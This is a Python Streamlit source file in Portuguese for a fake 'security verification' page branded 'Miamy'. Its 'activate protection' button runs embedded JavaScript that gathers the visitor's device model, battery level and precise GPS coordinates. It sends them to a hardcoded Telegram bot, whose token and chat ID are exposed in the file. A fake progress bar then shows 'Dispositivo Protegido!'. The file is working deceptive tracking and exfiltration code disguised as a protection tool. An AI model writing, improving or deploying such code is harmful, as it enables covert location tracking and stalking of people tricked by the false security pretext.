import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS ORIGINAL MIAMY ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; }
    .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; }
    .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
    .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
    .footer { 
        position: fixed; left: 0; bottom: 20px; width: 100%; 
        text-align: center; color: #555; font-size: 10px; font-family: sans-serif;
        padding: 0 10px; line-height: 1.4;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)

placeholder_texto = st.empty()
placeholder_barra = st.empty()

placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)

# --- MOTOR JS MELHORADO (TENTA PEGAR MODELO NO ANDROID NOVO) ---
js_final = f"""
<div class="btn-container">
    <button class="meu-botao" id="btn_ativar">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('btn_ativar').onclick = async function() {{
    let info_aparelho = "Android Device";
    
    // Tenta pegar o modelo real (High Entropy) que o Android 14/15/16 exige
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {{
        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
        info_aparelho = (hints.model || "Android") + " (v" + (hints.platformVersion || "16") + ")";
    }} else {{
        // Fallback caso o de cima falhe
        let detalhes = navigator.userAgent.match(/\\((.*?)\\)/);
        if (detalhes) info_aparelho = detalhes[1].replace("Linux; ", "");
    }}

    navigator.geolocation.getCurrentPosition(
        async function(pos) {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + lat + "," + lon;

                var img = new Image();
                img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&parse_mode=Markdown&text=" + encodeURIComponent(msg);
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{
                // Envio de segurança se a bateria travar
                var img = new Image();
                img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent("🛡️ PROTEÇÃO ATIVADA (v16)\\n📱 Aparelho: " + info_aparelho + "\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude);
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }}
        }},
        function(err) {{
            alert("Ação Necessária: Ative a localização para concluir a segurança do Sistema Miamy.");
        }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}};
</script>
"""

clicou = st.components.v1.html(js_final, height=150)

# Rodapé completo solicitado
st.markdown('<div class="footer">SISTEMA INTEGRADO DE SEGURANÇA DESENVOLVIDO POR Miamy © 2026<br>Todos os Direitos Reservados</div>', unsafe_allow_html=True)

if clicou:
    for p in range(0, 101, 2):
        placeholder_texto.markdown(f'<div class="status-container">Verificando hardware: {p}%</div>', unsafe_allow_html=True)
        placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
        time.sleep(0.02)
    st.success("Dispositivo Protegido!")
    st.stop()
